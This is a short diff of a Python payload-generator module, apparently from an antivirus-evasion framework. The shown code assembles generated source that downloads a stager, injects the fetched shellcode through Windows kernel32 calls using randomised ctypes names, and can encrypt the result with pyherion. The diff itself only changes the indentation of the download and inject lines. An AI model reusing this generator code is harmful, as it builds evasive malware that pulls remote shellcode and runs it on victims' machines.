@@ -130,9 +130,9 @@ class PayloadModule:
             payload_code += '\t' * num_tabs_required + "\t\t" + randctypes + '.windll.kernel32.WaitForSingleObject(' + randctypes + '.c_int(' + handleName + '),' + randctypes + '.c_int(-1))\n'
 
         # download the stager
-        payload_code += "%s = %s()\n" %(shellCodeName, getDataMethodName)
+        payload_code += '\t' * num_tabs_required + "%s = %s()\n" %(shellCodeName, getDataMethodName)
         # inject what we grabbed
-        payload_code += "%s(%s)\n" % (injectMethodName, shellCodeName)
+        payload_code += '\t' * num_tabs_required + "%s(%s)\n" % (injectMethodName, shellCodeName)
 
         if self.required_options["USE_PYHERION"][0].lower() == "y":
             payload_code = encryption.pyherion(payload_code)
